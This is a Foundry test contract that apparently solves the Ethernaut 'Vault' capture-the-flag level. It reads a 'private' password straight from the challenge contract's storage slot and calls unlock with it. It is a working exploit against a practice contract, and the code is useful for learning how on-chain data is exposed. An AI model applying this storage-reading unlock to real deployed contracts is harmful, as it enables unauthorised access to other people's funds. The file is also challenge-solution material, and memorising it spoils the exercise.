// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

contract VaultTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xf94b476063B6379A3c8b6C836efB8B3e10eDe188);
  }

  function testExploit() public {
    // as reading another's contract storage
    // is not supported by solidity (i.e. It needs a forge "cheatcode"),
    // imagine this attack being made from a forge script
    bytes32 password = vm.load(challengeAddress, bytes32(uint256(1)));

    // too lazy to write the interface code above?
    (bool success,) = challengeAddress.call(abi.encodeWithSignature("unlock(bytes32)", password));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
